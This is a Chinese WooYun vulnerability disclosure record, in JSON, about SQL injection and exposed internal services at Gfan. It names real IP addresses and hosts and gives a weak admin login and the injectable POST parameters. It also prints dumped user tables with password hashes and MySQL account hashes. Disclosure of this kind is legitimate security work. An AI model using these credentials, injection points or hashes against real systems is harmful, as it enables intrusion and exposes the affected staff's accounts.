{"id": 6653, "wybug_id": "wooyun-2013-044760", "wybug_title": "机锋网内部服务系统外泄和SQL注入", "wybug_corp": "机锋网", "wybug_author": "浩天", "wybug_date": "2013-12-03 10:47", "wybug_open_date": "2014-01-17 10:48", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "数据库账户权限过高", "管理后台对外", "注射技巧", "后台被猜解"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-17：\t细节向公众公开  简要描述： 这个系统有意思了 详细说明：  地址：1、订餐系统：http://117.79.80.24:8089/2、gfan redmine系统，居然可以注册，这个没深测，跑搞坏了：http://redmine.corp.gfan.com:8080/\n\n3、tomcat管理对外开放http://117.79.80.24:8088/   漏洞证明：  主要说订餐系统，存在sql注入、弱口令、phpinfoa、http://117.79.80.24:8089/login.php账号：admin   密码：123456\n\nb、sql注入获得好多密码：http://117.79.80.24:8089/order_action.phppost注入参数：username=(字符型)、food[]=(整形)，确实没开gpcusername=%E5%BC%A0%E8%B6%85&num_44=1&food%5B%5D=529&price=15&Submit=%E6%8F%90%E4%BA%A4\n\navailable databases [6]:[*] diner[*] gfandb[*] information_schema[*] mysql[*] performance_schema[*] testDatabase: gfandbTable: tb_users[11 entries]+-----------+--------+--------------------------------+| login_id  | name   | password                       |+-----------+--------+--------------------------------+| aaabbb    | aaabbb | e79218965eb72c92a549dd5a330112 || abcdef    | abcdef | 0adc3949ba59abbe56e057f20f883e || gfantop   | admin  | 9c1162e57cd5baeb731f6dc43d529f || admin2    | admin2 | e79218965eb72c92a549dd5a330112 || gfdata    | gfdata | 9ea4708a83bec2aeecfd0b79e445d2 || xiaoxiao  |        | e79218965eb72c92a549dd5a330112 || putong    |        | b0a7b894946b01e26370fa961e76dd || thefeinno |        | e79218965eb72c92a549dd5a330112 || duyun     |        | 4b2f7b12c093b7ccc51085fd2be1d3 || aceshi    |        | 0adc3949ba59abbe56e057f20f883e || huangxd   |        | 562befbf799a6ca45dc7ae1e0f93aa |+-----------+--------+--------------------------------+Database: dinerTable: users[1 entry]+----------------------------------+-----------+| password                         | user_name |+----------------------------------+-----------+| e10adc3949ba59abbe56e057f20f883e | admin     |+----------------------------------+-----------+mysql.userhost\tusername\tpassword10.8.42.103\t\t*3E3A435817F182356FDE2105E60B1F07BBCB53B3localhost\t\t*3E3A435817F182356FDE2105E60B1F07BBCB53B3c、话说知道网站绝对路径就能拿shell，能拿没拿，就是费点劲，看看phpinfo吧\n\n   修复方案：  改一下吧，陆续还会提交漏洞的   版权声明：转载请注明来源 浩天@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2013-12-03 11:40 厂商回复： 谢谢，处理中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-03 12:07 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  看来是没拿shell做跳板，只能...    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}